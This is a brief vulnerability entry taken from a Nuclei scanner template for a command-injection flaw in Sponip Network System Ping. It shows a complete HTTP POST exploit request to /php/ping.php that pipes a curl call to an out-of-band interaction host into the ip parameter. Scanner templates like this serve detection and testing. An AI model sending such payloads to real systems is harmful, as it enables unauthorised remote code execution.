# Vulnerability: Sponip Network System Ping - Remote Code Execution
**Classification:** CWE-77
**Source:** Nuclei Template (`sponip-network-system-ping-rce.yaml`)

## Description
Sponip Network System Ping is susceptible to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /php/ping.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

sondata[ip]=a|curl {{interactsh-url}}&jsondata[type]=1
```

